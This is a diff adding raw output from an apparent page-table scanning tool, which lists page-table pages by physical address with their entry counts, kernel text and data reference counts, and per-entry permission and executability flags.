+[!] PT page at PA 0xf0e7000: 74 present entries, 0 kdata refs, 1 ktext refs
+    [ 39] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xf0e9000: 84 present entries, 2 kdata refs, 2 ktext refs
+    [182] 0x0000000012026567 → PA=0x12026000 4KB RW User X
+    [184] 0x0000000012027467 → PA=0x12027000 4KB RW User X
+
+[!] PT page at PA 0xf129000: 220 present entries, 0 kdata refs, 1 ktext refs
+    [416] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf146000: 167 present entries, 0 kdata refs, 1 ktext refs
+    [397] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf193000: 271 present entries, 1 kdata refs, 1 ktext refs
+    [409] 0x8900000011be4101 → PA=0x11be4000 4KB RO Kern NX
+
+[!] PT page at PA 0xf19f000: 82 present entries, 0 kdata refs, 2 ktext refs
+    [222] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [400] 0x00000000110e0001 → PA=0x110e0000 4KB RO Kern X
+
+[!] PT page at PA 0xf1a6000: 235 present entries, 0 kdata refs, 1 ktext refs
+    [394] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf1c8000: 207 present entries, 0 kdata refs, 1 ktext refs
+    [448] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf1c9000: 218 present entries, 0 kdata refs, 1 ktext refs
+    [192] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf1cb000: 160 present entries, 0 kdata refs, 1 ktext refs
+    [320] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf221000: 201 present entries, 0 kdata refs, 2 ktext refs
+    [ 69] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [157] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf24a000: 177 present entries, 0 kdata refs, 2 ktext refs
+    [288] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [450] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf24f000: 152 present entries, 0 kdata refs, 1 ktext refs
+    [451] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf255000: 218 present entries, 0 kdata refs, 1 ktext refs
+    [  8] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf25b000: 182 present entries, 0 kdata refs, 1 ktext refs
+    [408] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf261000: 216 present entries, 0 kdata refs, 1 ktext refs
+    [392] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf270000: 195 present entries, 0 kdata refs, 2 ktext refs
+    [423] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [451] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf27c000: 204 present entries, 0 kdata refs, 1 ktext refs
+    [ 30] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf291000: 194 present entries, 0 kdata refs, 2 ktext refs
+    [385] 0x000000001100ae01 → PA=0x1100a000 4KB RO Kern X
+    [441] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf2a9000: 197 present entries, 0 kdata refs, 1 ktext refs
+    [161] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf2ae000: 185 present entries, 0 kdata refs, 2 ktext refs
+    [  7] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [105] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf2c7000: 203 present entries, 0 kdata refs, 1 ktext refs
+    [314] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf339000: 205 present entries, 0 kdata refs, 1 ktext refs
+    [324] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf343000: 203 present entries, 0 kdata refs, 1 ktext refs
+    [ 22] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf349000: 177 present entries, 0 kdata refs, 1 ktext refs
+    [275] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf354000: 224 present entries, 0 kdata refs, 1 ktext refs
+    [157] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf355000: 174 present entries, 0 kdata refs, 1 ktext refs
+    [ 31] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf35d000: 206 present entries, 0 kdata refs, 1 ktext refs
+    [ 37] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf35e000: 237 present entries, 0 kdata refs, 1 ktext refs
+    [350] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf364000: 200 present entries, 0 kdata refs, 1 ktext refs
+    [ 36] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf366000: 222 present entries, 0 kdata refs, 1 ktext refs
+    [389] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf36c000: 233 present entries, 0 kdata refs, 1 ktext refs
+    [ 13] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf3b3000: 224 present entries, 0 kdata refs, 1 ktext refs
+    [302] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf3bd000: 163 present entries, 0 kdata refs, 1 ktext refs
+    [438] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf3bf000: 177 present entries, 0 kdata refs, 1 ktext refs
+    [134] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf3c4000: 180 present entries, 0 kdata refs, 1 ktext refs
+    [282] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf3c5000: 212 present entries, 0 kdata refs, 1 ktext refs
+    [261] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf3d4000: 208 present entries, 0 kdata refs, 1 ktext refs
+    [433] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf3d6000: 202 present entries, 0 kdata refs, 1 ktext refs
+    [357] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf406000: 52 present entries, 1 kdata refs, 1 ktext refs
+    [471] 0x0000000012954d37 → PA=0x12954000 4KB RW User X
+
+[!] PT page at PA 0xf40d000: 188 present entries, 0 kdata refs, 1 ktext refs
+    [269] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf42b000: 233 present entries, 0 kdata refs, 2 ktext refs
+    [199] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [229] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf42c000: 168 present entries, 0 kdata refs, 3 ktext refs
+    [  5] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [180] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [215] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf431000: 177 present entries, 0 kdata refs, 3 ktext refs
+    [274] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [288] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [329] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf472000: 232 present entries, 0 kdata refs, 2 ktext refs
+    [267] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [320] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf473000: 199 present entries, 0 kdata refs, 1 ktext refs
+    [448] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf478000: 200 present entries, 0 kdata refs, 1 ktext refs
+    [417] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf48d000: 202 present entries, 0 kdata refs, 1 ktext refs
+    [144] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf49e000: 235 present entries, 0 kdata refs, 1 ktext refs
+    [ 27] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf4ab000: 212 present entries, 0 kdata refs, 1 ktext refs
+    [180] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf4bd000: 197 present entries, 0 kdata refs, 1 ktext refs
+    [398] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf4c6000: 213 present entries, 0 kdata refs, 1 ktext refs
+    [269] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf4ca000: 217 present entries, 0 kdata refs, 1 ktext refs
+    [ 59] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf4d1000: 178 present entries, 0 kdata refs, 1 ktext refs
+    [471] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf4fd000: 194 present entries, 0 kdata refs, 1 ktext refs
+    [401] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf512000: 214 present entries, 0 kdata refs, 2 ktext refs
+    [276] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [290] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf513000: 193 present entries, 0 kdata refs, 1 ktext refs
+    [  5] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf521000: 186 present entries, 0 kdata refs, 1 ktext refs
+    [179] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf531000: 192 present entries, 0 kdata refs, 1 ktext refs
+    [281] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf551000: 203 present entries, 0 kdata refs, 1 ktext refs
+    [426] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf55b000: 224 present entries, 0 kdata refs, 1 ktext refs
+    [135] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf564000: 192 present entries, 0 kdata refs, 1 ktext refs
+    [ 48] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf579000: 4 present entries, 0 kdata refs, 1 ktext refs
+    [368] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xf587000: 56 present entries, 0 kdata refs, 1 ktext refs
+    [482] 0x0010000011111111 → PA=0x11111000 4KB RO Kern X
+
+[!] PT page at PA 0xf5a0000: 241 present entries, 0 kdata refs, 1 ktext refs
+    [166] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf5a3000: 232 present entries, 0 kdata refs, 1 ktext refs
+    [340] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf5b2000: 202 present entries, 0 kdata refs, 1 ktext refs
+    [439] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf5b4000: 227 present entries, 0 kdata refs, 1 ktext refs
+    [393] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf5bd000: 183 present entries, 0 kdata refs, 1 ktext refs
+    [391] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf5bf000: 221 present entries, 0 kdata refs, 1 ktext refs
+    [310] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf5d6000: 196 present entries, 0 kdata refs, 1 ktext refs
+    [  7] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf625000: 230 present entries, 0 kdata refs, 1 ktext refs
+    [  7] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf65a000: 268 present entries, 2 kdata refs, 2 ktext refs
+    [319] 0x4400000011e8fe63 → PA=0x11e8f000 4KB RW Kern X
+    [335] 0x4400000011e8fe63 → PA=0x11e8f000 4KB RW Kern X
+
+[!] PT page at PA 0xf677000: 250 present entries, 1 kdata refs, 1 ktext refs
+    [169] 0xc700000012bfc855 → PA=0x12bfc000 4KB RO User NX
+
+[!] PT page at PA 0xf6be000: 206 present entries, 1 kdata refs, 1 ktext refs
+    [245] 0x0000000012570705 → PA=0x12570000 4KB RO User X
+
+[!] PT page at PA 0xf6dd000: 230 present entries, 1 kdata refs, 1 ktext refs
+    [112] 0x4c00000011ba007b → PA=0x11ba0000 4KB RW Kern X
+
+[!] PT page at PA 0xf700000: 18 present entries, 0 kdata refs, 3 ktext refs
+    [126] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [254] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [510] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xf701000: 19 present entries, 0 kdata refs, 6 ktext refs
+    [126] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [158] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [318] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [382] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [446] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [510] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xf702000: 19 present entries, 0 kdata refs, 4 ktext refs
+    [ 62] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [126] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [190] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [254] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xf703000: 27 present entries, 0 kdata refs, 5 ktext refs
+    [ 94] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [286] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [350] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [414] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [478] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xf7c8000: 241 present entries, 0 kdata refs, 1 ktext refs
+    [444] 0x4800000010c845c7 → PA=0x10c84000 2MB RW User X
+
+[!] PT page at PA 0xf7cd000: 190 present entries, 0 kdata refs, 1 ktext refs
+    [ 64] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf7ce000: 195 present entries, 0 kdata refs, 1 ktext refs
+    [320] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf7e1000: 179 present entries, 0 kdata refs, 1 ktext refs
+    [145] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf7e2000: 198 present entries, 0 kdata refs, 1 ktext refs
+    [310] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf7e3000: 205 present entries, 0 kdata refs, 1 ktext refs
+    [410] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf811000: 181 present entries, 0 kdata refs, 1 ktext refs
+    [448] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf81a000: 204 present entries, 0 kdata refs, 1 ktext refs
+    [440] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf826000: 187 present entries, 0 kdata refs, 1 ktext refs
+    [263] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf82c000: 206 present entries, 0 kdata refs, 1 ktext refs
+    [287] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf838000: 202 present entries, 0 kdata refs, 2 ktext refs
+    [393] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [406] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf853000: 206 present entries, 0 kdata refs, 1 ktext refs
+    [144] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf864000: 149 present entries, 0 kdata refs, 1 ktext refs
+    [417] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf867000: 200 present entries, 0 kdata refs, 1 ktext refs
+    [293] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf870000: 220 present entries, 0 kdata refs, 1 ktext refs
+    [ 66] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf873000: 207 present entries, 0 kdata refs, 1 ktext refs
+    [417] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf875000: 187 present entries, 0 kdata refs, 1 ktext refs
+    [302] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf87b000: 234 present entries, 0 kdata refs, 1 ktext refs
+    [ 33] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf87e000: 225 present entries, 0 kdata refs, 1 ktext refs
+    [293] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf87f000: 157 present entries, 0 kdata refs, 1 ktext refs
+    [161] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf886000: 214 present entries, 0 kdata refs, 1 ktext refs
+    [  8] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf89d000: 206 present entries, 0 kdata refs, 1 ktext refs
+    [324] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf8a5000: 212 present entries, 0 kdata refs, 1 ktext refs
+    [272] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf8a6000: 181 present entries, 0 kdata refs, 2 ktext refs
+    [184] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [304] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf8b1000: 203 present entries, 0 kdata refs, 1 ktext refs
+    [ 43] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf8b6000: 199 present entries, 0 kdata refs, 2 ktext refs
+    [394] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [452] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf8bc000: 199 present entries, 0 kdata refs, 1 ktext refs
+    [286] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf8e8000: 198 present entries, 0 kdata refs, 1 ktext refs
+    [212] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf8eb000: 232 present entries, 0 kdata refs, 1 ktext refs
+    [393] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf8fd000: 205 present entries, 0 kdata refs, 1 ktext refs
+    [163] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf910000: 76 present entries, 0 kdata refs, 2 ktext refs
+    [428] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [463] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xf913000: 62 present entries, 0 kdata refs, 3 ktext refs
+    [103] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [138] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [171] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xf920000: 206 present entries, 0 kdata refs, 2 ktext refs
+    [ 21] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [ 45] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf924000: 162 present entries, 0 kdata refs, 1 ktext refs
+    [ 24] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf936000: 222 present entries, 0 kdata refs, 1 ktext refs
+    [  8] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf938000: 215 present entries, 0 kdata refs, 1 ktext refs
+    [287] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf950000: 200 present entries, 0 kdata refs, 1 ktext refs
+    [157] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf963000: 209 present entries, 0 kdata refs, 1 ktext refs
+    [ 11] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf96d000: 214 present entries, 0 kdata refs, 1 ktext refs
+    [170] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf991000: 192 present entries, 0 kdata refs, 1 ktext refs
+    [408] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf997000: 217 present entries, 0 kdata refs, 1 ktext refs
+    [ 22] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf9b1000: 293 present entries, 1 kdata refs, 1 ktext refs
+    [224] 0xe800000012be0259 → PA=0x12be0000 4KB RO Kern NX
+
+[!] PT page at PA 0xf9be000: 90 present entries, 0 kdata refs, 2 ktext refs
+    [282] 0x0000000010d87d37 → PA=0x10d87000 4KB RW User X
+    [286] 0xc380000010d87d37 → PA=0x10d87000 4KB RW User NX
+
+[!] PT page at PA 0xf9e1000: 202 present entries, 0 kdata refs, 2 ktext refs
+    [269] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [283] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfa5f000: 204 present entries, 0 kdata refs, 1 ktext refs
+    [236] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfa64000: 212 present entries, 0 kdata refs, 1 ktext refs
+    [  9] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfa82000: 201 present entries, 0 kdata refs, 1 ktext refs
+    [393] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfa89000: 222 present entries, 0 kdata refs, 1 ktext refs
+    [157] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfaa7000: 181 present entries, 0 kdata refs, 2 ktext refs
+    [ 21] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [ 54] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfac3000: 227 present entries, 0 kdata refs, 1 ktext refs
+    [432] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfb16000: 211 present entries, 0 kdata refs, 2 ktext refs
+    [150] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [164] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfb29000: 226 present entries, 0 kdata refs, 1 ktext refs
+    [ 35] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfb39000: 68 present entries, 0 kdata refs, 2 ktext refs
+    [ 94] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [129] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xfb3b000: 58 present entries, 0 kdata refs, 2 ktext refs
+    [281] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [316] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xfb3d000: 70 present entries, 0 kdata refs, 2 ktext refs
+    [468] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [503] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xfb46000: 178 present entries, 0 kdata refs, 1 ktext refs
+    [158] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfb56000: 225 present entries, 0 kdata refs, 1 ktext refs
+    [273] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfb5a000: 189 present entries, 0 kdata refs, 1 ktext refs
+    [451] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfb60000: 207 present entries, 0 kdata refs, 1 ktext refs
+    [468] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfb72000: 224 present entries, 0 kdata refs, 1 ktext refs
+    [397] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfb76000: 210 present entries, 0 kdata refs, 2 ktext refs
+    [400] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [425] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfb7d000: 222 present entries, 0 kdata refs, 2 ktext refs
+    [471] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [485] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfb8f000: 167 present entries, 0 kdata refs, 1 ktext refs
+    [269] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfc20000: 234 present entries, 0 kdata refs, 1 ktext refs
+    [457] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfc22000: 210 present entries, 0 kdata refs, 1 ktext refs
+    [ 58] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfc26000: 145 present entries, 0 kdata refs, 2 ktext refs
+    [149] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [206] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfc38000: 207 present entries, 0 kdata refs, 2 ktext refs
+    [263] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [282] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfc4b000: 245 present entries, 1 kdata refs, 1 ktext refs
+    [392] 0x4c00000011bec04d → PA=0x11bec000 4KB RO User X
+
+[!] PT page at PA 0xfc5a000: 170 present entries, 0 kdata refs, 4 ktext refs
+    [391] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [400] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [435] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [456] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfc9e000: 198 present entries, 0 kdata refs, 1 ktext refs
+    [165] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfcb2000: 217 present entries, 0 kdata refs, 2 ktext refs
+    [137] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [150] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfcf9000: 187 present entries, 0 kdata refs, 1 ktext refs
+    [393] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfcfc000: 193 present entries, 0 kdata refs, 2 ktext refs
+    [141] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [281] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfcfe000: 233 present entries, 0 kdata refs, 1 ktext refs
+    [142] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfcff000: 222 present entries, 0 kdata refs, 2 ktext refs
+    [166] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [180] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xfd2c000: 246 present entries, 0 kdata refs, 2 ktext refs
+    [179] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+    [245] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+
+[!] PT page at PA 0xfd2d000: 262 present entries, 0 kdata refs, 1 ktext refs
+    [482] 0x0000000010c744c7 → PA=0x10c74000 2MB RW User X
+
+[!] PT page at PA 0xfd2f000: 228 present entries, 0 kdata refs, 3 ktext refs
+    [133] 0x0000000010d644c7 → PA=0x10d64000 2MB RW User X
+    [365] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+    [464] 0x0000000010c244c7 → PA=0x10c24000 2MB RW User X
+
+[!] PT page at PA 0xfd38000: 249 present entries, 0 kdata refs, 2 ktext refs
+    [ 36] 0x0000000010ca44c7 → PA=0x10ca4000 2MB RW User X
+    [470] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+
+[!] PT page at PA 0xfd3a000: 269 present entries, 0 kdata refs, 1 ktext refs
+    [182] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+
